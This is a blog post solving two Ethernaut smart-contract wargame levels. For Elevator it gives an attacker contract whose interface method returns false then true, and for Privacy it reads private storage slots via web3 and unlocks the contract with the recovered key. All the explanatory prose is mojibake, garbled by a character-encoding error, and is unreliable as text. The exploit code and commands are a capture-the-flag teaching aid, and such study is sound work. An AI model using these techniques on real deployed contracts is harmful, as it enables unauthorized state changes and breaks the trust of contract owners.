---
layout: post
title: "Ethernaut Solution(2/2)"
date: 2018-09-20
description: # Add post description (optional)
img: leaves.jpg
tag: [Ethereum, Solidity, Ethernaut]
---

### 11. Elevator (difficulty 4/10)

> This elevator won't let you reach the top of your building. Right?

"ì´ ì—˜ë¦¬ë² ì´í„°ëŠ” ë¹Œë”© ê¼­ëŒ€ê¸°ê¹Œì§€ ê°€ì§€ ì•ŠìŠµë‹ˆë‹¤. ì •ë§ ê·¸ëŸ´ê¹Œìš”?" ë¬¸ì œê°€ ë” ì–´ë µê²Œ ëŠê»´ì§‘ë‹ˆë‹¤.ğŸ˜…

ì†”ë¦¬ë””í‹°ëŠ” ê°„í˜¹ ì˜ˆìƒì¹˜ ëª»í•œ ë°©í–¥ìœ¼ë¡œ ì‘ë™í•  ë•Œê°€ ìˆìŠµë‹ˆë‹¤. ë¬¸ì œì˜ ì»¨íŠ¸ë™íŠ¸ë¥¼ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤. ìš°ì„  Buildingì´ë¼ëŠ” ì¸í„°í˜ì´ìŠ¤ê°€ ìˆê³  Elevatorë¼ëŠ” ì»¨íŠ¸ë™íŠ¸ê°€ ìˆìŠµë‹ˆë‹¤.
Building ì¸í„°í˜ì´ìŠ¤ë¥¼ êµ¬í˜„í•˜ë©´ì„œ Elevator ì»¨íŠ¸ë™íŠ¸ë¥¼ ì‚¬ìš©í•  ê²ƒì…ë‹ˆë‹¤.

{% highlight javascript %}
if (! building.isLastFloor(_floor)) {
    floor = _floor;
    top = building.isLastFloor(floor);
}
{% endhighlight %}

`! building.isLastFloor(_floor)`ê°€ trueì´ë©´ ì¡°ê±´ë¬¸ìœ¼ë¡œ ë“¤ì–´ê°‘ë‹ˆë‹¤. ì´ê²ƒì€ isLastFloorê°€ falseì´ë©´
ë§ˆì§€ë§‰ ì¸µì´ ëª‡ ì¸µì¸ì§€ ìƒê´€ì—†ì´ ë§ˆì§€ë§‰ ì¸µì„ ë‚˜íƒ€ë‚´ëŠ” bool topì´ trueê°€ ë  ìˆ˜ ì—†ëŠ” ê²ƒì²˜ëŸ¼ ë³´ì…ë‹ˆë‹¤.

ê·¸ëŸ°ë° ì—¬ê¸°ì„œ ê°„ê³¼í•œ ë¬¸ì œê°€ ìˆìŠµë‹ˆë‹¤. isLastFloorëŠ” ì¸í„°í˜ì´ìŠ¤ë¡œ ì •ì˜ë˜ì–´ ìˆê³  êµ¬í˜„í•˜ê¸° ë‚˜ë¦„ì´ë¼ëŠ” ì ì…ë‹ˆë‹¤. ë˜ ìœ„ì˜ ì¡°ê±´ì„ ì˜ ë³´ë©´ isLastFloorë¥¼ ë‘ ë²ˆ í˜¸ì¶œí•˜ê³  ìˆìŠµë‹ˆë‹¤.
ë‹¤ì‹œ ë§í•´ì„œ isLastFloorì˜ ë‘ ë²ˆì§¸ í˜¸ì¶œí•´ì„œë„ ì²« ë²ˆì§¸ì™€ ë™ì¼í•œ ê°’ì„ ë¦¬í„´í•  ê²ƒì´ë¼ê³  ìƒê°í•˜ëŠ” ê²ƒì´ì£ .

{% highlight javascript %}
interface Building {
    function isLastFloor(uint) view public returns (bool);
}
{% endhighlight %}

ë§Œì•½ì— isLastFloorë¥¼ ì²« ë²ˆì§¸ì—ëŠ” false, ì´ë ‡ê²Œ í•´ì„œ ì¡°ê±´ë¬¸ìœ¼ë¡œ ë“¤ì–´ê°„ ë‹¤ìŒì—, ì¡°ê±´ë¬¸ ë‚´ì—ì„œ, ë‘ ë²ˆì§¸ì—ëŠ” trueë¥¼ ë¦¬í„´í•˜ê²Œ ë§Œë“¤ë©´ ì–´ë–»ê²Œ ë ê¹Œìš”? ì´ë ‡ê²Œ í•˜ë©´
ëª¨ë“  ì¸µì— ê°ˆ ìˆ˜ ìˆëŠ” Elevator ì»¨íŠ¸ë™íŠ¸ê°€ ë˜ëŠ” ê²ƒì…ë‹ˆë‹¤(í† ê¸€ ìŠ¤ìœ„ì¹˜ë¥¼ ìƒê°í•˜ë©´ ë  ê²ƒ ê°™ìŠµë‹ˆë‹¤).

{% highlight javascript %}
pragma solidity ^0.4.25;

interface Building {
    function isLastFloor(uint) view public returns (bool);
}

contract HackBuilding is Building {

    address public owner;
    Elevator public elevator;
    bool public toggleFlag;

    constructor (address _addr) public {
        owner = msg.sender;
        elevator = Elevator(_addr);
    }

     modifier onlyOwner {
        require (msg.sender == owner);
        _;
    }

    function isLastFloor(uint _floor) view public returns (bool) {
        _floor;
        if (!toggleFlag) {
            toggleFlag = true;
            return false;
        } else {
            toggleFlag = false;
            return true;
        }
    }

    function reachTheTopFloor() external onlyOwner {
        elevator.goTo(100);
    }
}

contract Elevator {
    function goTo(uint _floor) public;
}
{% endhighlight %}


ë‹¤ìŒê³¼ ê°™ì€ ê²°ê³¼ê°€ ë‚˜ì˜¤ë©´ ì„±ê³µì…ë‹ˆë‹¤.

{% highlight html %}
await contract.top()
true
{% endhighlight %}

ê·¸ëŸ°ë° ì ê¹ë§Œ! isLastFloor ë©”ì†Œë“œëŠ” ìƒíƒœë³€ìˆ˜ë¥¼ ì½ì„ ìˆ˜ë§Œ ìˆëŠ” view ë©”ì†Œë“œì¸ë° toggleFlag ìƒíƒœë³€ìˆ˜ë¥¼ ì–´ë–»ê²Œ ë°”ê¿€ ìˆ˜ ìˆì£ ? ğŸ˜•
ê·¸ê²ƒì€ ì†”ë¦¬ë””í‹° ì»´íŒŒì¼ëŸ¬ ë²„ì „ì— ë”°ë¼ ë‹¤ë¦…ë‹ˆë‹¤. ì—¬ê¸°ì„œ ì‚¬ìš©í•œ 0.4.25 ì´í•˜ì—ì„œëŠ” view ë¡œ ì§€ì •í–ˆë‹¤ê³  í•˜ì—¬ ì»´íŒŒì¼ ì˜¤ë¥˜ê°€ ë°œìƒí•˜ì§€ëŠ” ì•ŠìŠµë‹ˆë‹¤. ê·¸ëƒ¥ ê²½ê³ ë§Œ í•  ë¿ì´ì£ .
0.5.0 ì´ìƒì—ì„œëŠ” ë³´ë‹¤ ì—„ê²©í•˜ê²Œ viewë¡œ ì§€ì •ëœ ë©”ì†Œë“œì—ì„œ ìƒíƒœë³€ìˆ˜ë¥¼ ë°”ê¾¸ëŠ” ì½”ë“œëŠ” ì»´íŒŒì¼ ì˜¤ë¥˜ê°€ ë°œìƒí•©ë‹ˆë‹¤.

<font color="red" size="2">
{% highlight html %}
TypeError: Function declared as view, but this expression (potentially) modifies the state and thus requires non-payable (the default) or payable.
{% endhighlight %}
</font>


### 12. Privacy (difficulty 8/10)

> Unlock this contract to beat the level.

ì£¼ì–´ì§„ ì»¨íŠ¸ë™íŠ¸ì˜ bool locked = falseë¡œ ë§Œë“¤ë©´ ë˜ëŠ” ë¬¸ì œì…ë‹ˆë‹¤. unlock ë©”ì†Œë“œëŠ” _keyë¥¼ ë°›ì•„ì„œ ì„¸ ë²ˆì§¸ ì•„ì´í…œê³¼ ê°™ì€ì§€
ë¹„êµí•´ì„œ ê°™ìœ¼ë©´ locked = falseë¡œ ë§Œë“­ë‹ˆë‹¤.

{% highlight javascript %}

function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
}
{% endhighlight %}

ì§€ë‚œ 8ë²ˆ ë¬¸ì œ Vaultì—ì„œ ë³¸ ê²ƒì²˜ëŸ¼ ìƒíƒœë³€ìˆ˜ê°€ privateë¼ê³  í•´ì„œ ì½ì§€ ëª»í•˜ëŠ” ê²ƒì€ ì•„ë‹™ë‹ˆë‹¤. ì§€ë‚œ ë¬¸ì œì™€ ë‹¤ë¥¸ ì ì€ ê³ ì •ê¸¸ì´ ë°°ì—´ì¸ ê²½ìš°ì— storageì˜ ë ˆì´ì•„ì›ƒì´ ì–´ë–»ê²Œ
ë˜ëŠ”ì§€, ë˜ íƒ€ì… ìºìŠ¤íŒ…ì´ ì–´ë–»ê²Œ ì´ë£¨ì–´ì§€ëŠ”ì§€ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤.


> * Understanding how storage works
* Understanding how parameter parsing works
* Understanding how casting works

ì»¨íŠ¸ë™íŠ¸ì˜ ìƒíƒœë³€ìˆ˜ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤. `bytes32[3] private data`ì— ìš°ë¦¬ê°€ ì°¾ìœ¼ë ¤ê³  í•˜ëŠ” ë°ì´í„°ê°€ ìˆì„ ê²ë‹ˆë‹¤. ì§€ë‚œ ë²ˆì— ì„¤ëª…í•œ ê²ƒì²˜ëŸ¼
ê° ìŠ¬ë¡¯ì€ 32ë°”ì´íŠ¸(256ë¹„íŠ¸) í¬ê¸°ë¡œ 0ë²ˆ ìŠ¬ë¡¯ë¶€í„° ì°¨ë¡€ë¡œ, ì—°ì†ì ìœ¼ë¡œ í• ë‹¹ë©ë‹ˆë‹¤. ìŠ¬ë¡¯ í¬ê¸°ë³´ë‹¤ ì‘ì€ ë°ì´í„° íƒ€ì…ì€ "tightly packed"í•˜ê²Œ ì €ì¥ë©ë‹ˆë‹¤.


{% highlight javascript %}
  bool public locked = true;
  uint256 public constant ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;
{% endhighlight %}


ì—¬ê¸°ì„œ ì•Œì•„ë‘ì–´ì•¼ í•  ê²ƒì€ ìƒíƒœë³€ìˆ˜ë¥¼ constantë¡œ ì„ ì–¸í•˜ëŠ” ê²½ìš°ëŠ” storageì— í• ë‹¹ë˜ì§€ ì•ŠëŠ”ë‹¤ëŠ” ì ì…ë‹ˆë‹¤. constantëŠ” ê°’ íƒ€ì…ë§Œ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

> The compiler does not reserve a storage slot for these variables, and every occurrence is replaced by the respective constant expression (which might be computed to a single value by the optimizer).

ì, ê·¸ë ‡ë‹¤ë©´ ìƒíƒœë³€ìˆ˜ ì„ ì–¸ë¶€ë¥¼ ë³´ë©´ì„œ ë ˆì´ì•„ì›ƒì„ ì§ì‘í•´ë³´ê² ìŠµë‹ˆë‹¤. ìš°ì„  ë‹¤ìŒê³¼ ê°™ì´ íŠ¸ëŸ¬í”Œ ì½˜ì†”ì„ í†µí•´ Ropstenì— ì—°ê²°í•œ í›„ `web3.eth.getStorageAt`ìœ¼ë¡œ ì¡°íšŒí•©ë‹ˆë‹¤.
ì²« ë²ˆì§¸ ìŠ¬ë¡¯ì…ë‹ˆë‹¤.

{% highlight html %}
truffle(ropsten)> web3.eth.getStorageAt("0x3e066a43f82688f611916e5fa56e6d4ce5e324ee", 0, "latest",
                                        function(e, result) {
                                            console.log(result)
                                        })
undefined
truffle(ropsten)> 0x000000000000000000000000000000000000000000000000000000aa43ff0a01
{% endhighlight %}

ë‘ ë²ˆì§¸ ì„¸ ë²ˆì§¸, ë„¤ ë²ˆì§¸, ì°¨ë¡€ë¡œ ì¡°íšŒí•´ë´…ì‹œë‹¤. ê·¸ëŸ¼ ë‹¤ìŒê³¼ ê°™ì€ ê²°ê³¼ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤(ë°ì´í„°ëŠ” ë‹¬ë¼ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤).

{% highlight html %}
web3.eth.getStorageAt("0x3e066a43f82688f611916e5fa56e6d4ce5e324ee", 1, ...)
0x1b1f4f5b10d488f8186dbd44a4bad9081edb28e41c8ea0cb2a6d4a159ea64d88

web3.eth.getStorageAt("0x3e066a43f82688f611916e5fa56e6d4ce5e324ee", 2, ...)
0x12c705440554fb18ddaf8743e55b5f4341a56709b11e3a4be677b7dcfdc1a328

web3.eth.getStorageAt("0x3e066a43f82688f611916e5fa56e6d4ce5e324ee", 3, ...)
0x7310fbc161ab8742d22d56264a4f79ff27c9c291d3eb951fe8bb7024b09d7a5c

web3.eth.getStorageAt("0x3e066a43f82688f611916e5fa56e6d4ce5e324ee", 4, ...)
0x0000000000000000000000000000000000000000000000000000000000000000
{% endhighlight %}

ë‹¤ì„¯ ë²ˆì§¸(ìŠ¬ë¡¯ ì¸ë±ìŠ¤ 4)ë¶€í„°ëŠ” ë°ì´í„°ê°€ ì—†êµ°ìš”. ë”°ë¼ì„œ ì €ì¥ ìŠ¬ë¡¯ì€ ëª¨ë‘ 4ê°œë¥¼ ì‚¬ìš©í•˜ê³  ìˆìŒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
í•œ ìŠ¬ë¡¯ì˜ í¬ê¸°ê°€ 32ë°”ì´íŠ¸(256ë¹„íŠ¸) ì´ë¯€ë¡œ ê·¸ ì•ˆì— ë“¤ì–´ê°ˆ ìˆ˜ ìˆëŠ” ê²ƒë“¤ì€ ë‹¤ìŒ 4ê°œì˜ ìƒíƒœë³€ìˆ˜ë“¤ì…ë‹ˆë‹¤. ìˆœì„œëŒ€ë¡œ ìŠ¬ë¡¯ì˜ ë’¤ì—ì„œë¶€í„° ì €ì¥ë©ë‹ˆë‹¤.

{% highlight javascript %}
  bool public locked = true;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
{% endhighlight %}

ì•„ë˜ì™€ ê°™ì´ ë©ë‹ˆë‹¤.

<table>
<tr>
    <td colspan="5" align="center"><b>SLOT 0</b></td>
</tr>
<tr>
    <td width="100"></td>
    <td width="100">uint16 awkwardness</td>
    <td width="100">uint8 denomination</td>
    <td width="100">uint8 flattening</td>
    <td width="100">bool locked</td>
</tr>
<tr>
    <td></td>
    <td>uint16(now)</td>
    <td>255</td>
    <td>10</td>
    <td>true</td>
</tr>
<tr>
    <td>0x0000...0000</td>
    <td>aa43</td>
    <td>ff</td>
    <td>0a</td>
    <td>01</td>
</tr>
</table>


ê³ ì •ê¸¸ì´ ë°°ì—´ì€ ì–´ë–»ê²Œ ë ê¹Œìš”? bytes32ì´ë¯€ë¡œ í•œ ìŠ¬ë¡¯ì”© ì°¨ì§€í•  ê²ƒì…ë‹ˆë‹¤.

{% highlight javascript %}
  bytes32[3] private data;
{% endhighlight %}



<table>
<tr>
    <td align="center" width="100"><b>SLOT 1</b></td>
    <td align="center" width="100"><b>SLOT 2</b></td>
    <td align="center" width="100"><b>SLOT 3</b></td>
</tr>
<tr>
    <td>bytes32 data[0]</td>
    <td>bytes32 data[1]</td>
    <td>bytes32 data[2]</td>
</tr>
<tr>
    <td>0x1b1f...4d88</td>
    <td>0x12c7...a328</td>
    <td>0x7310...7a5c</td>
</tr>
</table>

ê²°êµ­ ìš°ë¦¬ê°€ ì•Œì•„ë‚´ë ¤ê³  í•˜ëŠ” í‚¤ ê°’ì€ data[2]ì…ë‹ˆë‹¤. ë¬¸ì œì—ì„œëŠ” bytes16(data[2])ìœ¼ë¡œ ìºìŠ¤íŒ…í–ˆìœ¼ë¯€ë¡œ Remixì—ì„œ ë‹¤ìŒê³¼ ê°™ì´ ìºìŠ¤íŒ…í•´ì„œ í‚¤ ê°’ì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% highlight javascript %}
function convert() public pure returns (bytes16 result) {
    bytes32 data = 0x7310fbc161ab8742d22d56264a4f79ff27c9c291d3eb951fe8bb7024b09d7a5c;
    result = bytes16(data);
}
{% endhighlight %}

bytes16ì€ ì²« ë²ˆì§¸ 16ë°”ì´íŠ¸ë§Œ ì˜ë¼ë‚´ë©´ ë©ë‹ˆë‹¤. ì´ì œ unlock ë©”ì†Œë“œë¥¼ ì‹¤í–‰í•˜ë©´ ë˜ê² êµ°ìš”!

{% highlight html %}
await contract.unlock("0x7310fbc161ab8742d22d56264a4f79ff")
{% endhighlight %}




[ethernaut]: https://ethernaut.zeppelin.solutions/


